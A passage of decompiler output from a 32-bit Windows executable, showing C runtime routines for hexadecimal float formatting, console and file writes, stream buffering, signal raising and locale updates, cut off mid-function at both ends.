        char *a4,
        unsigned int a5,
        signed int Size,
        unsigned __int8 a7,
        unsigned int a8,
        struct __crt_locale_pointers *a9)
{
  int v9; // edi
  char *v10; // esi
  int v11; // edi
  __int64 v12; // rcx
  char *v13; // eax
  _BYTE *v14; // edx
  char *v15; // esi
  char v16; // al
  unsigned int v17; // edx
  int v18; // ecx
  int v19; // eax
  unsigned __int64 v20; // rax
  unsigned int v21; // eax
  unsigned int v22; // ecx
  unsigned __int64 v23; // rax
  char *i; // eax
  char v25; // cl
  char v26; // cl
  int v27; // esi
  char *v28; // edx
  char *v29; // edi
  signed __int64 v31; // [esp-1Ch] [ebp-58h]
  signed __int64 v32; // [esp-1Ch] [ebp-58h]
  signed __int64 v33; // [esp-1Ch] [ebp-58h]
  int v34[3]; // [esp+4h] [ebp-38h] BYREF
  char v35; // [esp+10h] [ebp-2Ch]
  char *v36; // [esp+18h] [ebp-24h]
  int v37; // [esp+20h] [ebp-1Ch]
  int v38; // [esp+28h] [ebp-14h]
  unsigned int v39; // [esp+2Ch] [ebp-10h]
  unsigned int v40; // [esp+30h] [ebp-Ch]
  int v41; // [esp+34h] [ebp-8h]
  char v42; // [esp+3Bh] [ebp-1h]

  v9 = Size;
  if ( Size < 0 )
    v9 = 0;
  v10 = Str;
  *Str = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v34, a9);
  if ( a3 > v9 + 11 )
  {
    HIDWORD(v12) = a1;
    LODWORD(v12) = *((_DWORD *)a1 + 1);
    if ( (((unsigned int)v12 >> 20) & 0x7FF) == 2047 )
    {
      v11 = fp_format_e(a1, Str, a3, a4, a5, v9, 0, a8, 0);
      if ( v11 )
      {
        *Str = 0;
      }
      else
      {
        v13 = strrchr(Str, 101);
        if ( v13 )
        {
          *v13 = 32 * (a7 ^ 1) + 80;
          v13[3] = 0;
        }
        v11 = 0;
      }
    }
    else
    {
      if ( (int)v12 < 0 )
      {
        *Str = 45;
        v10 = Str + 1;
        LODWORD(v12) = *((_DWORD *)a1 + 1);
      }
      v14 = v10 + 1;
      v39 = 1023;
      v42 = a7 ^ 1;
      v36 = v10 + 1;
      v37 = 32 * (a7 ^ 1) + 7;
      if ( (v12 & 0x7FF00000) != 0 )
      {
        *v10 = 49;
      }
      else
      {
        *v10 = 48;
        if ( *((_DWORD *)a1 + 1) & 0xFFFFF | *(_DWORD *)a1 )
          v39 = 1022;
        else
          v39 = 0;
      }
      v15 = v10 + 2;
      v40 = (unsigned int)(v14 + 1);
      if ( v9 )
        v16 = ***(_BYTE ***)(v34[1] + 136);
      else
        v16 = 0;
      *v14 = v16;
      v38 = *((_DWORD *)a1 + 1) & 0xFFFFF;
      if ( v38 || *(_DWORD *)a1 )
      {
        v17 = 0;
        v18 = 983040;
        LOWORD(v19) = 48;
        v41 = 48;
        v40 = 0;
        v38 = 983040;
        do
        {
          if ( v9 <= 0 )
            break;
          LODWORD(v20) = v17 & *(_DWORD *)a1;
          HIDWORD(v20) = v18 & *((_DWORD *)a1 + 1) & 0xFFFFF;
          v21 = (unsigned __int16)((v20 >> v41) + 48);
          if ( v21 > 0x39 )
            LOBYTE(v21) = v37 + v21;
          v22 = v38;
          v17 = __PAIR64__(v38, v40) >> 4;
          *v15++ = v21;
          v18 = v22 >> 4;
          v19 = v41 - 4;
          --v9;
          v40 = v17;
          v38 = v18;
          v41 = v19;
        }
        while ( (v19 & 0x8000u) == 0 );
        v40 = (unsigned int)v15;
        if ( (v19 & 0x8000u) == 0 )
        {
          LODWORD(v23) = v17 & *(_DWORD *)a1;
          HIDWORD(v23) = v18 & *((_DWORD *)a1 + 1) & 0xFFFFF;
          if ( (unsigned __int16)(v23 >> v41) > 8u )
          {
            for ( i = v15 - 1; ; --i )
            {
              v25 = *i;
              if ( *i != 102 && v25 != 70 )
                break;
              *i = 48;
            }
            HIDWORD(v12) = a1;
            if ( i == v36 )
            {
              ++*(i - 1);
            }
            else
            {
              if ( v25 == 57 )
                v26 = v37 + 58;
              else
                v26 = v25 + 1;
              *i = v26;
            }
          }
        }
      }
      if ( v9 > 0 )
      {
        memset(v15, 48, v9);
        v15 += v9;
        v40 = (unsigned int)v15;
      }
      if ( !*v36 )
      {
        v15 = v36;
        v40 = (unsigned int)v36;
      }
      *v15 = 32 * v42 + 80;
      v27 = (((*(_QWORD *)HIDWORD(v12) >> 52) & 0x7FFi64) - (unsigned __int64)v39) >> 32;
      LODWORD(v12) = ((*(_QWORD *)HIDWORD(v12) >> 52) & 0x7FF) - v39;
      v28 = (char *)(v40 + 2);
      v36 = (char *)(v40 + 2);
      if ( v27 < 0 )
      {
        LODWORD(v12) = -(int)v12;
        v27 = (unsigned __int64)-__SPAIR64__(v27, v12) >> 32;
        BYTE4(v12) = 45;
      }
      else
      {
        BYTE4(v12) = 43;
      }
      *(_BYTE *)(v40 + 1) = BYTE4(v12);
      v29 = v28;
      *v28 = 48;
      if ( v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0x3E8) )
      {
        v31 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 1000;
        v27 = HIDWORD(v12);
        v37 = (unsigned __int64)(v31 / 1000) >> 32;
        v28 = v36;
        *v36 = v31 / 1000 + 48;
        v29 = v28 + 1;
      }
      if ( v29 != v28 || v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0x64) )
      {
        v32 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 100;
        v27 = HIDWORD(v12);
        v37 = (unsigned __int64)(v32 / 100) >> 32;
        v28 = v36;
        *v29++ = v32 / 100 + 48;
      }
      if ( v29 != v28 || v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0xA) )
      {
        v33 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 10;
        v36 = (char *)((unsigned __int64)(v33 / 10) >> 32);
        *v29++ = v33 / 10 + 48;
      }
      *v29 = v12 + 48;
      v29[1] = 0;
      v11 = 0;
    }
  }
  else
  {
    v11 = 34;
    *_errno() = 34;
    _invalid_parameter_noinfo();
  }
  if ( v35 )
    *(_DWORD *)(v34[0] + 848) &= ~2u;
  return v11;
}

//----- (0047349C) --------------------------------------------------------
char __cdecl sub_47349C(FILE *Stream)
{
  int v1; // eax
  void **v2; // edi
  char *v3; // eax

  v1 = _fileno(Stream);
  if ( !_isatty(v1) )
    return 0;
  if ( Stream == __acrt_iob_func(1u) )
  {
    v2 = &dword_500930;
  }
  else
  {
    if ( Stream != __acrt_iob_func(2u) )
      return 0;
    v2 = &dword_500934;
  }
  ++dword_5001B8;
  if ( (Stream->_flag & 0x4C0) != 0 )
    return 0;
  _InterlockedOr(&Stream->_flag, 0x282u);
  v3 = (char *)*v2;
  if ( *v2 || (*v2 = _malloc_base(0x1000u), _free_base(0), (v3 = (char *)*v2) != 0) )
  {
    Stream->_cnt = (int)v3;
    Stream->_ptr = (char *)*v2;
    Stream->_base = (char *)4096;
    Stream->_bufsiz = 4096;
  }
  else
  {
    Stream->_base = (char *)2;
    Stream->_cnt = (int)&Stream->_charbuf;
    Stream->_ptr = (char *)&Stream->_charbuf;
    Stream->_bufsiz = 2;
  }
  return 1;
}
// 5001B8: using guessed type int dword_5001B8;

//----- (004739BD) --------------------------------------------------------
DWORD *__cdecl sub_4739BD(DWORD *a1, int a2, char *a3, int a4)
{
  LPCRITICAL_SECTION v4; // eax
  int v5; // ebx
  int v6; // ecx
  const char *v7; // edi
  int v8; // esi
  LPCRITICAL_SECTION v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  int v13; // edi
  int v14; // edx
  int v15; // esi
  char *v16; // edi
  int v17; // edx
  int v18; // edi
  int v19; // esi
  int v20; // ecx
  unsigned int v21; // eax
  signed int v22; // ecx
  char v23; // dl
  int v24; // eax
  const char *v25; // eax
  _BYTE *v26; // esi
  int v27; // edx
  char v28; // al
  int v29; // esi
  bool v30; // zf
  _BYTE *v31; // esi
  int v32; // edx
  char v33; // al
  int v34; // edx
  int v35; // ecx
  DWORD *result; // eax
  struct _Mbstatet *v37; // [esp+0h] [ebp-98h]
  unsigned int v38[2]; // [esp+Ch] [ebp-8Ch] BYREF
  int v39[2]; // [esp+14h] [ebp-84h] BYREF
  int v40; // [esp+1Ch] [ebp-7Ch]
  UINT CodePage; // [esp+20h] [ebp-78h]
  wchar_t v42[2]; // [esp+24h] [ebp-74h] BYREF
  HANDLE hFile; // [esp+28h] [ebp-70h]
  char *SrcCh; // [esp+2Ch] [ebp-6Ch]
  int v45; // [esp+30h] [ebp-68h]
  unsigned int v46; // [esp+34h] [ebp-64h]
  DWORD NumberOfBytesWritten; // [esp+38h] [ebp-60h] BYREF
  DWORD LastError; // [esp+3Ch] [ebp-5Ch]
  int v49; // [esp+40h] [ebp-58h]
  DWORD v50; // [esp+44h] [ebp-54h]
  int v51; // [esp+48h] [ebp-50h]
  int v52; // [esp+4Ch] [ebp-4Ch]
  wchar_t DstCh[2]; // [esp+50h] [ebp-48h] BYREF
  int v54[3]; // [esp+54h] [ebp-44h] BYREF
  char v55; // [esp+60h] [ebp-38h]
  const char *v56; // [esp+64h] [ebp-34h] BYREF
  size_t Size; // [esp+68h] [ebp-30h]
  __int16 v58; // [esp+6Ch] [ebp-2Ch] BYREF
  int cchWideChar; // [esp+70h] [ebp-28h]
  void *Src; // [esp+74h] [ebp-24h]
  unsigned __int8 v61; // [esp+7Bh] [ebp-1Dh]
  CHAR Buffer[8]; // [esp+7Ch] [ebp-1Ch] BYREF
  char v63[8]; // [esp+84h] [ebp-14h] BYREF
  char v64[8]; // [esp+8Ch] [ebp-Ch] BYREF

  SrcCh = a3;
  v51 = a2 >> 6;
  v4 = lpCriticalSection[a2 >> 6];
  v52 = 56 * (a2 & 0x3F);
  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v4[1].DebugInfo + v52);
  v46 = (unsigned int)&a3[a4];
  v5 = 0;
  CodePage = GetConsoleCP();
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v54, 0);
  LastError = 0;
  v6 = *(_DWORD *)(v54[1] + 8);
  v40 = v6;
  v49 = 0;
  v50 = 0;
  v7 = a3;
  Src = a3;
  if ( a3 >= &a3[a4] )
    goto LABEL_51;
  v8 = v49;
  while ( 1 )
  {
    HIBYTE(v58) = *v7;
    *(_DWORD *)DstCh = 0;
    cchWideChar = 1;
    v9 = lpCriticalSection[v51];
    Size = (size_t)v9;
    if ( v6 == 65001 )
    {
      v10 = v52;
      v11 = (int)&v9[1].SpinCount + v52 + 2;
      v12 = 0;
      v45 = v11;
      do
      {
        if ( !*(_BYTE *)(v11 + v12) )
          break;
        ++v12;
      }
      while ( v12 < 5 );
      v13 = v46 - (_DWORD)Src;
      cchWideChar = v12;
      if ( v12 <= 0 )
      {
        v22 = byte_4F88E0[*(unsigned __int8 *)Src] + 1;
        Size = v22;
        if ( v22 <= v13 )
        {
          v16 = (char *)Src;
          v38[0] = 0;
          v38[1] = 0;
          v56 = (const char *)Src;
          cchWideChar = (v22 == 4) + 1;
          v21 = __crt_mbstring::__mbsrtowcs_utf8(
                  (__crt_mbstring *)DstCh,
                  (wchar_t *)&v56,
                  (const char **)cchWideChar,
                  (unsigned int)v38,
                  v37);
LABEL_20:
          if ( v21 == -1 )
            goto LABEL_51;
          v7 = &v16[Size - 1];
          goto LABEL_30;
        }
        if ( v13 <= 0 )
          goto LABEL_43;
        v31 = Src;
        do
        {
          v32 = v5 + v10;
          v33 = v31[v5++];
          *((_BYTE *)&lpCriticalSection[v51][1].SpinCount + v32 + 2) = v33;
          v10 = v52;
        }
        while ( v5 < v13 );
      }
      else
      {
        v56 = (const char *)(byte_4F88E0[*(unsigned __int8 *)(v52 + Size + 46)] + 1);
        Size = (size_t)&v56[-v12];
        if ( (int)&v56[-v12] <= v13 )
        {
          v14 = 0;
          v15 = v45;
          do
          {
            v64[v14] = *(_BYTE *)(v15 + v14);
            ++v14;
          }
          while ( v14 < v12 );
          v16 = (char *)Src;
          if ( (int)Size > 0 )
          {
            memmove(&v64[v12], Src, Size);
            v12 = cchWideChar;
          }
          if ( v12 > 0 )
          {
            v17 = cchWideChar;
            v18 = 0;
            v19 = v52;
            do
            {
              v20 = v19 + v18++;
              *((_BYTE *)&lpCriticalSection[v51][1].SpinCount + v20 + 2) = 0;
            }
            while ( v18 < v17 );
            v16 = (char *)Src;
          }
          v39[0] = 0;
          *(_DWORD *)v42 = v64;
          v39[1] = 0;
          cchWideChar = (v56 == (const char *)4) + 1;
          v21 = __crt_mbstring::__mbsrtowcs_utf8(
                  (__crt_mbstring *)DstCh,
                  v42,
                  (const char **)cchWideChar,
                  (unsigned int)v39,
                  v37);
          goto LABEL_20;
        }
        if ( v13 <= 0 )
          goto LABEL_43;
        v26 = Src;
        do
        {
          v27 = v12 + v5 + v10;
          v28 = v26[v5++];
          *((_BYTE *)&lpCriticalSection[v51][1].SpinCount + v27 + 2) = v28;
          v12 = cchWideChar;
          v10 = v52;
        }
        while ( v5 < v13 );
      }
      v8 = v49;
LABEL_43:
      v29 = v13 + v8;
LABEL_44:
      v30 = v55 == 0;
      v49 = v29;
      goto LABEL_52;
    }
    v23 = *((_BYTE *)&v9[1].SpinCount + v52 + 1);
    if ( (v23 & 4) != 0 )
    {
      v63[0] = *((_BYTE *)&v9[1].SpinCount + v52 + 2);
      v63[1] = *v7;
      *(_BYTE *)(v52 + Size + 45) = v23 & 0xFB;
      v24 = mbtowc(DstCh, v63, 2u);
      goto LABEL_29;
    }
    v61 = *v7;
    if ( (__pctype_func()[v61] & 0x8000u) == 0 )
    {
      v24 = mbtowc(DstCh, v7, 1u);
LABEL_29:
      if ( v24 == -1 )
        goto LABEL_51;
      goto LABEL_30;
    }
    v56 = v7 + 1;
    if ( (unsigned int)(v7 + 1) >= v46 )
    {
      v34 = v51;
      v35 = v52;
      *((_BYTE *)&lpCriticalSection[v51][1].SpinCount + v52 + 2) = v61;
      *((_BYTE *)&lpCriticalSection[v34][1].SpinCount + v35 + 1) |= 4u;
      v29 = v8 + 1;
      goto LABEL_44;
    }
    if ( mbtowc(DstCh, v7, 2u) == -1 )
      goto LABEL_51;
    v7 = v56;
LABEL_30:
    Src = (void *)++v7;
    v25 = (const char *)__acrt_WideCharToMultiByte(CodePage, 0, DstCh, cchWideChar, Buffer, 5, 0, 0);
    v56 = v25;
    if ( !v25 )
      goto LABEL_51;
    if ( !WriteFile(hFile, Buffer, (DWORD)v25, &NumberOfBytesWritten, 0) )
      break;
    v8 = (int)&v7[v50 - (_DWORD)SrcCh];
    v49 = v8;
    if ( NumberOfBytesWritten < (unsigned int)v56 )
      goto LABEL_51;
    if ( HIBYTE(v58) == 10 )
    {
      v58 = 13;
      if ( !WriteFile(hFile, &v58, 1u, &NumberOfBytesWritten, 0) )
        break;
      if ( !NumberOfBytesWritten )
        goto LABEL_51;
      ++v50;
      v49 = ++v8;
    }
    if ( (unsigned int)v7 >= v46 )
      goto LABEL_51;
    v6 = v40;
  }
  LastError = GetLastError();
LABEL_51:
  v30 = v55 == 0;
LABEL_52:
  if ( !v30 )
    *(_DWORD *)(v54[0] + 848) &= ~2u;
  result = a1;
  *a1 = LastError;
  a1[1] = v49;
  a1[2] = v50;
  return result;
}
// 473AB2: conditional instruction was optimized away because ecx.4>=1
// 473B2E: variable 'v37' is possibly undefined
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 4739BD: using guessed type char var_C[8];

//----- (00474136) --------------------------------------------------------
int __cdecl sub_474136(int FileHandle, const void *a2, int a3)
{
  int v3; // edi
  int v5; // [esp+10h] [ebp-20h]

  if ( FileHandle == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
    return -1;
  }
  if ( FileHandle < 0
    || FileHandle >= (unsigned int)dword_500920
    || (v5 = 56 * (FileHandle & 0x3F), (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v5) & 1) == 0) )
  {
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
    return -1;
  }
  __acrt_lowio_lock_fh(FileHandle);
  v3 = -1;
  if ( (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v5) & 1) != 0 )
  {
    v3 = sub_474228(FileHandle, a2, a3);
  }
  else
  {
    *_errno() = 9;
    *__doserrno() = 0;
  }
  __acrt_lowio_unlock_fh(FileHandle);
  return v3;
}
// 4736D7: using guessed type _DWORD __cdecl __acrt_lowio_lock_fh(_DWORD);
// 47378C: using guessed type _DWORD __cdecl __acrt_lowio_unlock_fh(_DWORD);
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 500920: using guessed type int dword_500920;

//----- (00474228) --------------------------------------------------------
int __cdecl sub_474228(int FileHandle, const void *a2, int a3)
{
  int v4; // edi
  LPCRITICAL_SECTION v5; // edx
  char v6; // bl
  bool v7; // cc
  _BYTE *v8; // ebx
  DWORD *v9; // eax
  int *p_LastError; // esi
  int v11; // ecx
  int v12; // edx
  LPCRITICAL_SECTION v13; // eax
  int v14; // eax
  int v15; // eax
  void *v16; // ecx
  int *v17; // esi
  DWORD LastError; // [esp+Ch] [ebp-28h] BYREF
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-20h]
  int v21; // [esp+18h] [ebp-1Ch]
  int v22; // [esp+1Ch] [ebp-18h]
  int v23; // [esp+20h] [ebp-14h]
  DWORD nNumberOfBytesToWrite; // [esp+24h] [ebp-10h]
  int v25; // [esp+28h] [ebp-Ch]
  int v26; // [esp+2Ch] [ebp-8h]
  LPCVOID lpBuffer; // [esp+30h] [ebp-4h]

  lpBuffer = a2;
  nNumberOfBytesToWrite = a3;
  if ( !a3 )
    return 0;
  if ( !a2
    || ((v4 = 56 * (FileHandle & 0x3F),
         v26 = FileHandle >> 6,
         v5 = lpCriticalSection[FileHandle >> 6],
         v25 = v4,
         v6 = *((_BYTE *)&v5[1].LockSemaphore + v4 + 1),
         v6 == 2)
     || v6 == 1)
    && (a3 & 1) != 0 )
  {
    *__doserrno() = 0;
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  if ( (*((_BYTE *)&v5[1].LockSemaphore + v4) & 0x20) != 0 )
    _lseeki64_nolock(FileHandle, 0i64, 2u);
  v21 = 0;
  v22 = 0;
  v23 = 0;
  if ( write_requires_double_translation_nolock(FileHandle) )
  {
    if ( v6 )
    {
      v7 = (unsigned __int8)(v6 - 1) <= 1u;
      v8 = lpBuffer;
      if ( !v7 )
      {
LABEL_28:
        v11 = v26;
        v12 = v25;
        goto LABEL_29;
      }
      v9 = (DWORD *)write_double_translated_unicode_nolock(&LastError, lpBuffer, nNumberOfBytesToWrite);
    }
    else
    {
      v8 = lpBuffer;
      v9 = sub_4739BD(&LastError, FileHandle, (char *)lpBuffer, nNumberOfBytesToWrite);
    }
    goto LABEL_14;
  }
  v11 = v26;
  v12 = v25;
  v13 = lpCriticalSection[v26];
  if ( *((char *)&v13[1].LockSemaphore + v25) >= 0 )
  {
    v16 = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v13[1].DebugInfo + v25);
    v8 = lpBuffer;
    LastError = 0;
    NumberOfBytesWritten = 0;
    v20 = 0;
    if ( !WriteFile(v16, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
      LastError = GetLastError();
    p_LastError = (int *)&LastError;
    goto LABEL_27;
  }
  v14 = v6;
  v8 = lpBuffer;
  if ( !v14 )
  {
    v9 = (DWORD *)write_text_ansi_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
    goto LABEL_14;
  }
  v15 = v14 - 1;
  if ( !v15 )
  {
    v9 = (DWORD *)write_text_utf8_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
    goto LABEL_14;
  }
  if ( v15 == 1 )
  {
    v9 = (DWORD *)write_text_utf16le_nolock(&LastError, FileHandle, lpBuffer, nNumberOfBytesToWrite);
LABEL_14:
    p_LastError = (int *)v9;
LABEL_27:
    v21 = *p_LastError;
    v17 = p_LastError + 1;
    v22 = *v17;
    v23 = v17[1];
    goto LABEL_28;
  }
LABEL_29:
  if ( v22 )
    return v22 - v23;
  if ( v21 )
  {
    if ( v21 == 5 )
    {
      *_errno() = 9;
      *__doserrno() = 5;
    }
    else
    {
      __acrt_errno_map_os_error(v21);
    }
    return -1;
  }
  if ( (*((_BYTE *)&lpCriticalSection[v11][1].LockSemaphore + v12) & 0x40) == 0 || *v8 != 26 )
  {
    *_errno() = 28;
    *__doserrno() = 0;
    return -1;
  }
  return 0;
}
// 4667BC: using guessed type _DWORD __cdecl __acrt_errno_map_os_error(_DWORD);
// 473D67: using guessed type int __cdecl write_double_translated_unicode_nolock(_DWORD, _DWORD, _DWORD);
// 473E40: using guessed type int __cdecl write_text_ansi_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 473F1B: using guessed type int __cdecl write_text_utf16le_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 474004: using guessed type int __cdecl write_text_utf8_nolock(_DWORD, _DWORD, _DWORD, _DWORD);
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];

//----- (00474C2E) --------------------------------------------------------
int __cdecl sub_474C2E(int a1)
{
  struct __crt_signal_action_t *const *v1; // ebx
  void (__cdecl **global_action_nolock)(int); // eax
  char v3; // cl
  struct __crt_signal_action_t *const *v4; // eax
  struct __crt_signal_action_t *v6; // eax
  void (__cdecl *v7)(_DWORD); // edx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // [esp+14h] [ebp-34h]
  int v12; // [esp+18h] [ebp-30h]
  uintptr_t *v13; // [esp+24h] [ebp-24h]
  void (__cdecl *v14)(_DWORD); // [esp+28h] [ebp-20h]
  bool v15; // [esp+2Eh] [ebp-1Ah]
  char v16; // [esp+2Fh] [ebp-19h]

  v1 = 0;
  v11 = 0;
  v16 = 1;
  if ( a1 > 8 )
  {
    if ( a1 != 11 )
    {
      if ( a1 == 15 || a1 > 20 && a1 <= 22 )
        goto LABEL_11;
      goto LABEL_15;
    }
  }
  else if ( a1 != 8 )
  {
    if ( a1 == 2 )
    {
LABEL_11:
      global_action_nolock = get_global_action_nolock(a1);
      goto LABEL_17;
    }
    if ( a1 != 4 )
    {
      if ( a1 == 6 )
        goto LABEL_11;
      goto LABEL_15;
    }
  }
  v4 = (struct __crt_signal_action_t *const *)__acrt_getptd_noexit();
  v1 = v4;
  if ( !v4 )
    return -1;
  v6 = siglookup(a1, *v4);
  if ( !v6 )
  {
LABEL_15:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  global_action_nolock = (void (__cdecl **)(int))((char *)v6 + 8);
  v3 = 0;
  v16 = 0;
LABEL_17:
  v13 = (uintptr_t *)global_action_nolock;
  v12 = 0;
  if ( v3 )
  {
    __acrt_lock(3);
    v3 = v16;
  }
  if ( v3 )
  {
    v7 = (void (__cdecl *)(_DWORD))__ROR4__(*v13 ^ __security_cookie, __security_cookie & 0x1F);
    v3 = v16;
  }
  else
  {
    v7 = (void (__cdecl *)(_DWORD))*v13;
  }
  v14 = v7;
  v15 = v7 == (void (__cdecl *)(_DWORD))1;
  if ( v7 == (void (__cdecl *)(_DWORD))1 )
    goto LABEL_38;
  if ( !v7 )
  {
    if ( v3 )
      __acrt_unlock(3);
    _exit(3);
  }
  if ( a1 == 8 || a1 == 11 || a1 == 4 )
  {
    v12 = *((_DWORD *)v1 + 1);
    *((_DWORD *)v1 + 1) = 0;
    if ( a1 != 8 )
      goto LABEL_33;
    v11 = *__fpecode();
    *__fpecode() = 140;
  }
  if ( a1 == 8 )
  {
    v8 = (int)*v1 + 36;
    v9 = (int)*v1 + 144;
    while ( v8 != v9 )
    {
      *(_DWORD *)(v8 + 8) = 0;
      v8 += 12;
    }
    goto LABEL_38;
  }
LABEL_33:
  *v13 = __security_cookie;
LABEL_38:
  if ( v16 )
    __acrt_unlock(3);
  if ( !v15 )
  {
    if ( a1 == 8 )
    {
      v10 = __acrt_getptd();
      ((void (__cdecl *)(int, _DWORD))v14)(8, *(_DWORD *)(v10 + 8));
    }
    else
    {
      v14(a1);
    }
    if ( a1 == 8 || a1 == 11 || a1 == 4 )
    {
      *((_DWORD *)v1 + 1) = v12;
      if ( a1 == 8 )
        *(_DWORD *)(__acrt_getptd() + 8) = v11;
    }
  }
  return 0;
}
// 474CCF: variable 'v3' is possibly undefined
// 46640C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 466454: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);
// 46FCE0: using guessed type int __acrt_getptd(void);
// 46FE37: using guessed type int __acrt_getptd_noexit(void);

//----- (00477CE0) --------------------------------------------------------
struct __crt_multibyte_data *sub_477CE0()
{
  struct __acrt_ptd *v0; // eax

  v0 = (struct __acrt_ptd *)__acrt_getptd();
  return update_thread_multibyte_data_internal(v0, &dword_500958);
}
// 46FCE0: using guessed type int __acrt_getptd(void);

//----- (004782F8) --------------------------------------------------------
int sub_4782F8()
{
  int result; // eax

  result = dword_50052C;
  if ( (void *)dword_50052C == dword_500538 )
  {
    result = copy_environment<char>(dword_50052C);
    dword_50052C = result;
  }
  return result;
}
// 478248: using guessed type _DWORD __cdecl copy_environment<char>(_DWORD);
// 50052C: using guessed type int dword_50052C;

//----- (004783F0) --------------------------------------------------------
char sub_4783F0()
{
  hHeap = 0;
  return 1;
}

//----- (004789B1) --------------------------------------------------------
int __cdecl sub_4789B1(int a1)
{
  int v1; // esi
  _DWORD *v2; // edi
  void **v3; // ebx
  int result; // eax
  _DWORD *v5; // esi
  _DWORD *v6; // edi
  wchar_t *v7; // edi
  int LocaleInfoA; // esi
  int v9; // esi
  int v10; // esi
  int v11; // esi
  _BYTE *v12; // edx
  char v13; // al
  volatile signed __int32 *v14; // eax
  volatile signed __int32 *v15; // ecx
  _BYTE *v16; // esi
  char v17; // cl
  struct __crt_locale_pointers v18; // [esp+Ch] [ebp-14h] BYREF
  int v19; // [esp+14h] [ebp-Ch]
  void *Block; // [esp+18h] [ebp-8h]
  void *v21; // [esp+1Ch] [ebp-4h]

  v1 = a1;
  v18.locinfo = (struct __crt_locale_data *)a1;
  v18.mbcinfo = 0;
  if ( !*(_DWORD *)(a1 + 176) && !*(_DWORD *)(a1 + 172) )
  {
    v2 = 0;
    v21 = 0;
    v3 = &off_4F81A0;
    goto LABEL_22;
  }
  v19 = 1;
  v3 = (void **)_calloc_base(1u, 0x50u);
  if ( !v3 )
    return 1;
  qmemcpy(v3, *(const void **)(a1 + 136), 0x50u);
  v5 = _malloc_base(4u);
  v2 = 0;
  v21 = v5;
  _free_base(0);
  if ( !v5 )
  {
    _free_base(v3);
    return 1;
  }
  *v5 = 0;
  v1 = a1;
  if ( !*(_DWORD *)(a1 + 176) )
  {
    *v3 = off_4F81A0;
    v3[1] = off_4F81A4;
    v3[2] = off_4F81A8;
    v3[12] = off_4F81D0;
    v3[13] = off_4F81D4;
    goto LABEL_20;
  }
  v6 = _malloc_base(4u);
  Block = v6;
  _free_base(0);
  if ( !v6 )
  {
    _free_base(v3);
LABEL_13:
    _free_base(v21);
    return v19;
  }
  *v6 = 0;
  v7 = *(wchar_t **)(a1 + 176);
  LocaleInfoA = __acrt_GetLocaleInfoA(&v18, 1, v7, 0xEu, (int)v3);
  v9 = __acrt_GetLocaleInfoA(&v18, 1, v7, 0xFu, (int)(v3 + 1)) | LocaleInfoA;
  v10 = __acrt_GetLocaleInfoA(&v18, 1, v7, 0x10u, (int)(v3 + 2)) | v9;
  v11 = __acrt_GetLocaleInfoA(&v18, 2, v7, 0xEu, (int)(v3 + 12)) | v10;
  if ( v11 | __acrt_GetLocaleInfoA(&v18, 2, v7, 0xFu, (int)(v3 + 13)) )
  {
    sub_478948(v3);
    _free_base(v3);
    _free_base(Block);
    v19 = -1;
    goto LABEL_13;
  }
  v12 = v3[2];
  while ( 1 )
  {
    v13 = *v12;
    if ( !*v12 )
      break;
    if ( (unsigned __int8)(v13 - 48) <= 9u )
    {
      *v12 = v13 - 48;
      goto LABEL_17;
    }
    if ( v13 == 59 )
    {
      v16 = v12;
      do
      {
        v17 = v16[1];
        *v16++ = v17;
      }
      while ( v17 );
    }
    else
    {
LABEL_17:
      ++v12;
    }
  }
  v2 = Block;
  v1 = a1;
LABEL_20:
  *(_DWORD *)v21 = 1;
  if ( v2 )
    *v2 = 1;
LABEL_22:
  v14 = *(volatile signed __int32 **)(v1 + 128);
  if ( v14 )
    _InterlockedDecrement(v14);
  v15 = *(volatile signed __int32 **)(v1 + 124);
  if ( v15 )
  {
    if ( !_InterlockedExchangeAdd(v15, 0xFFFFFFFF) )
    {
      _free_base(*(void **)(v1 + 124));
      _free_base(*(void **)(v1 + 136));
    }
  }
  *(_DWORD *)(v1 + 124) = v21;
  result = 0;
  *(_DWORD *)(v1 + 128) = v2;
  *(_DWORD *)(v1 + 136) = v3;
  return result;
}
// 478948: using guessed type _DWORD __cdecl sub_478948(_DWORD);
// 4F81A0: using guessed type void *off_4F81A0;
// 4F81A4: using guessed type void *off_4F81A4;
// 4F81A8: using guessed type void *off_4F81A8;
// 4F81D0: using guessed type void *off_4F81D0;
// 4F81D4: using guessed type void *off_4F81D4;

//----- (00479435) --------------------------------------------------------
int sub_479435()
{
  int v0; // eax
  int *v1; // edi
  int v2; // esi

  v0 = __acrt_getptd();
  v1 = (int *)(v0 + 76);
  if ( (dword_4F83B8 & *(_DWORD *)(v0 + 848)) == 0 || (v2 = *v1) == 0 )
  {
    __acrt_lock(4);
    v2 = _updatetlocinfoEx_nolock(v1, dword_50056C);
    __acrt_unlock(4);
    if ( !v2 )
      abort();
  }
  return v2;
